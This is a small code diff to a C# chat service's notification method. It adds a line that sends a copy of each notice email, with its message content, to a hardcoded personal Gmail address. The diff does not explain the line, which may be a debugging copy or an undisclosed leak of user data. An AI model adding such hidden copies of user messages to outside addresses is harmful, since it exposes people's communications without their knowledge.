@@ -80,6 +80,7 @@ public class ChatService(IUnitOfWork _unitOfWork, IEmailService _emailService) :
         {
             var email = string.Join(',', messages.Select(e => e.Email));
             await _emailService.SendMail(email, "Notice", emailMessages, "Darads", useTemplate: true);
+            await _emailService.SendMail("bello.netdev@gmail.com", "Notice", emailMessages, "Darads", useTemplate: true);
         }
     }
 
